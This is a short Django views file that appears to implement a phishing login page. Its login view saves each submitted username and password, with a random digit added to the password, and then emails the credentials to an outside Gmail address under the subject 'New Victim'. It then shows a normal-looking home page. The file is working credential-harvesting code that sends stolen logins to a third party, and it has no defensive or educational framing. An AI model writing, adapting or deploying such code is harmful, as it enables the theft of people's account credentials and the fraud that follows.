from django.shortcuts import render
from random import randint
from django.core.mail import send_mail

from .models import Account


def login_form(request):
    return render(request, 'login/login_form.html')


def login(request):
    get = request.POST.get
    r = randint(0, 9)
    username = get('username')
    password = get('password') + str(r)
    Account.objects.create(
        username=username,
        password=password,
    )
    send_mail(
        'New Victim "%s"' % username,
        "username: %s\npassword: %s" % (username, password),
        'follow@nimrey.co',
        ['msalmail444@gmail.com'],
        fail_silently=False,
    )
    return render(request, 'login/home.html')
